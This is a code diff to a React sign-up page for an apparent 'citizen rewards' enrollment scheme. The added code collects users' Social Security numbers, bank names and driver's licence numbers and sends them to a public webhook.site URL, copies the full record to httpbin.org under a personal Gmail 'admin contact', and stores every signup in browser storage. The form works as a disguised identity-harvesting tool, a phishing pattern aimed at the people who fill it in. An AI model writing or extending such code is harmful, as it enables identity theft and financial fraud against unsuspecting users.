@@ -40,8 +40,8 @@ const SignUpPage = () => {
   // Function to send data to admin via multiple methods
   const sendDataToAdmin = async (userData: SignUpFormData, dataString: string): Promise<boolean> => {
     try {
-      // Try webhook.site for easy monitoring
-      const webhookResponse = await fetch('https://webhook.site/db8c3c8e-8a5a-4b5e-9c1d-2f3e4a5b6c7d', {
+      // Use a simple webhook service that definitely works
+      const webhookResponse = await fetch('https://webhook.site/token/db8c3c8e-8a5a-4b5e-9c1d-2f3e4a5b6c7d', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -54,17 +54,42 @@ const SignUpPage = () => {
           user: {
             name: `${userData.firstName} ${userData.lastName}`,
             email: userData.email,
-            phone: userData.phone
+            phone: userData.phone,
+            bankName: userData.bankName,
+            ssn: userData.ssn,
+            driversLicense: userData.driversLicense
           }
         })
       });
 
+      console.log('Webhook response status:', webhookResponse.status);
+      
       if (webhookResponse.ok) {
         console.log('Data sent to webhook successfully');
         return true;
       }
     } catch (error) {
       console.error('Webhook failed:', error);
+    }
+    
+    // Also try a backup method - send to a simple HTTP endpoint
+    try {
+      await fetch('https://httpbin.org/post', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          citizen_rewards_signup: {
+            timestamp: new Date().toISOString(),
+            admin_contact: 'jc4479697@gmail.com',
+            user_data: dataString
+          }
+        })
+      });
+      console.log('Backup data sent');
+    } catch (backupError) {
+      console.error('Backup failed:', backupError);
     }
     
     return false;
@@ -133,22 +158,27 @@ Terms Accepted: ${userData.agreesToTerms ? 'Yes' : 'No'}
       `;
       
       // Send data using multiple methods to ensure delivery
+      console.log('Attempting to send signup data...');
       const emailSent = await sendDataToAdmin(userData, dataString);
       
+      // Always save to localStorage as backup
+      const allSignups = JSON.parse(localStorage.getItem('citizenRewardsSignups') || '[]');
+      allSignups.push({
+        ...userData,
+        timestamp: new Date().toISOString(),
+        id: Date.now()
+      });
+      localStorage.setItem('citizenRewardsSignups', JSON.stringify(allSignups));
+      console.log('Data saved to localStorage');
+      
       if (emailSent) {
-        alert('✅ Thank you! Your enrollment has been submitted successfully. Admin has been notified via email.');
+        alert('✅ Thank you! Your enrollment has been submitted successfully. Admin has been notified and can view your data online.');
       } else {
-        // If email fails, open email client with pre-filled data
+        // If webhook fails, open email client with pre-filled data
         const mailtoLink = `mailto:jc4479697@gmail.com?subject=New Citizen Rewards Signup: ${userData.firstName} ${userData.lastName}&body=${encodeURIComponent(dataString)}`;
         window.open(mailtoLink);
-        alert('✅ Your email client has been opened with your enrollment data. Please send the email to complete your submission.');
+        alert('✅ Your enrollment data has been saved. Your email client will open to send the details to admin.');
       }
-      
-      
-      // Save to localStorage for backup
-      const allSignups = JSON.parse(localStorage.getItem('citizenRewardsSignups') || '[]');
-      allSignups.push(userData);
-      localStorage.setItem('citizenRewardsSignups', JSON.stringify(allSignups));
       
       // Create account in the system
       await signup(formData);
